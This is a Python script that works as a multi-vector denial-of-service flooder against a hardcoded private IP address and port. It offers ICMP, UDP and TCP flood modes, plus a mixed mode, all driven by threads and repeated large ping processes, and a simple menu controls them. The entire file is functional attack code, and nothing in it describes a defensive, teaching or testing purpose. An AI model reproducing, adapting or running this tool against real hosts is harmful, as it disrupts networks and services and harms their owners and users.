import socket
import threading
import subprocess
import os
import random
import time

TARGET_IP = "192.168.50.40"
TARGET_PORT = 8443
attack_event = threading.Event()
threads = []

def stop_all():
    attack_event.clear()
    os.system("taskkill /IM ping.exe /F >nul 2>&1")
    for t in threads:
        t.join(timeout=0.1)
    threads.clear()

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Force the socket to non-blocking mode
    sock.setblocking(False)
    
    # Shrink the Windows OS transmit buffer to prevent packet stockpiling
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024)
    
    payload = random.randbytes(1024)
    
    while attack_event.is_set():
        try: 
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except BlockingIOError:
            # Buffer is full, yield thread context instantly
            time.sleep(0)
        except Exception:
            pass
    sock.close()

def tcp_flood():
    while attack_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.close()
        except Exception:
            pass

def launch_attack(mode):
    stop_all()
    attack_event.set()
    
    if mode == "1":
        subprocess.Popen(["ping", TARGET_IP, "-t"], stdout=subprocess.DEVNULL)
    elif mode == "2":
        for _ in range(10): subprocess.Popen(["ping", TARGET_IP, "-t", "-l", "65000"], stdout=subprocess.DEVNULL)
    elif mode == "3":
        for _ in range(20): 
            t = threading.Thread(target=udp_flood, daemon=True)
            t.start(); threads.append(t)
    elif mode == "4":
        for _ in range(20): 
            t = threading.Thread(target=tcp_flood, daemon=True)
            t.start(); threads.append(t)
    elif mode == "5":
        for _ in range(5): subprocess.Popen(["ping", TARGET_IP, "-t", "-l", "65000"], stdout=subprocess.DEVNULL)
        for _ in range(10):
            t1 = threading.Thread(target=udp_flood, daemon=True)
            t2 = threading.Thread(target=tcp_flood, daemon=True)
            t1.start(); t2.start()
            threads.extend([t1, t2])

if __name__ == "__main__":
    os.system("taskkill /IM ping.exe /F >nul 2>&1")
    while True:
        print("\n0. Stop All | 1. Normal | 2. ICMP Flood | 3. UDP Flood | 4. TCP Flood | 5. Mixed Vector")
        choice = input("Select mode: ")
        if choice == '0': stop_all()
        elif choice in ['1', '2', '3', '4', '5']: launch_attack(choice)
        